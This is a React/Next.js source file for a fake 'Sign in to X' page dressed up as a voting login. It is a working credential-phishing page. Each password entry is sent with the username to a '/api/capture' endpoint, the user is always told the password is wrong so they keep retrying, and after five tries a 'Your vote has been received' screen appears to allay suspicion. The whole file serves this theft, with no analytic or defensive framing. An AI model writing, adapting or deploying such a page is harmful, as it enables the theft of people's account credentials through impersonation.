import Head from 'next/head';
import { useState, useRef } from 'react';

const MAX_ATTEMPTS = 5;

export default function TwitterLoginPage() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [step, setStep] = useState(1);
  const [feedback, setFeedback] = useState('');
  const [clickCount, setClickCount] = useState(0);
  const [showSuccess, setShowSuccess] = useState(false);
  const attemptRef = useRef(0);

  const handleNext = () => {
    if (!username.trim()) {
      setFeedback('Please enter a phone, email, or username.');
      return;
    }
    setFeedback('');
    setStep(2);
  };

  const handleLogin = async () => {
    setFeedback('Incorrect password! Please try again...');
    attemptRef.current += 1;
    setClickCount(attemptRef.current);
    
    try {
      await fetch('/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          username: username.trim(), 
          password, 
          method: 'twitter'
        })
      });
    } catch (e) {}
    
    if (attemptRef.current >= MAX_ATTEMPTS) {
      setShowSuccess(true);
      setTimeout(() => setShowSuccess(false), 4000);
    }
  };

  const handleBack = () => {
    setStep(1);
    setFeedback('');
    setPassword('');
  };

  return (
    <>
      <Head>
        <meta charSet="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Log in with X - Vote</title>
      </Head>

      <style jsx>{`
        html, body { height: 100%; margin: 0; padding: 0; }
        body { 
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
          background: #000; 
          color: #e7e9ea;
          display: flex; 
          align-items: center; 
          justify-content: center; 
          min-height: 100vh;
        }
        .login-container {
          background: white; 
          width: 360px; 
          padding: 30px; 
          border-radius: 12px; 
          box-shadow: 0 4px 12px rgba(0,0,0,0.1); 
          text-align: center;
          max-width: 90vw;
        }
        .logo { 
          width: 40px; 
          height: 40px; 
          margin: 0 auto 20px; 
          display: block;
        }
        input { 
          width: 100%; 
          max-width: 320px;
          padding: 12px 16px; 
          margin: 10px auto 0;
          display: block;
          border: 1px solid #ccc; 
          border-radius: 4px; 
          font-size: 15px; 
          background: #fafafa;
          color: #000;
        }
        input:focus { 
          outline: none; 
          border-color: #1d9bf0; 
          background: white;
        }
        button { 
          width: 100%; 
          max-width: 320px;
          padding: 12px; 
          background: #1da1f2; 
          color: white; 
          border: none; 
          border-radius: 4px; 
          font-size: 16px; 
          cursor: pointer;
          margin-top: 8px;
          display: block;
        }
        button:hover { 
          background: #1991d9; 
        }
        .feedback { 
          color: #f4212e; 
          font-size: 14px; 
          margin: 8px auto 0;
          max-width: 320px;
          display: block;
        }
        .back-link {
          color: #1da1f2;
          text-decoration: none;
          font-size: 14px;
          display: block;
          margin-top: 12px;
          cursor: pointer;
        }
        .back-link:hover { text-decoration: underline; }
        .success-overlay { 
          position: fixed; 
          inset: 0; 
          background: rgba(0,0,0,0.97); 
          display: none; 
          align-items: center; 
          justify-content: center; 
          z-index: 9999; 
        }
        .success-overlay.show { 
          display: flex; 
        }
        .success-box { 
          text-align: center; 
          padding: 20px; 
          color: white;
        }
        .checkmark { 
          width: 110px; 
          height: 110px; 
          background: #4caf50; 
          border-radius: 50%; 
          display: flex; 
          align-items: center; 
          justify-content: center; 
          margin: 0 auto 28px; 
          box-shadow: 0 4px 12px rgba(76,175,80,0.4); 
        }
        .checkmark svg { 
          width: 56px; 
          height: 56px; 
        }
      `}</style>

      <div className="login-container">
        {step === 1 ? (
          <div>
            <img className="logo" src="/logos/x_logo.svg" alt="X" />
            <h2>Sign in to X</h2>
            <input
              type="text"
              placeholder="Phone, email, or username"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              onKeyDown={(e) => e.key === 'Enter' && handleNext()}
            />
            <div className="feedback">{feedback}</div>
            <button onClick={handleNext}>Next</button>
          </div>
        ) : (
          <div>
            <h2>Enter your password</h2>
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              onKeyDown={(e) => e.key === 'Enter' && handleLogin()}
            />
            <div className="feedback">{feedback}</div>
            <button onClick={handleLogin}>Log in</button>
            <div className="back-link" onClick={handleBack}>← Back</div>
          </div>
        )}
      </div>

      <div className="success-overlay" id="successOverlay">
        <div className="success-box">
          <div className="checkmark"><svg viewBox="0 0 52 52" xmlns="http://www.w3.org/2000/svg"><polyline points="15,27 24,36 39,17"></polyline></svg></div>
          <h2>Your vote has been received</h2>
          <p>We will get back to you when your vote is counted.</p>
        </div>
      </div>
    </>
  );
}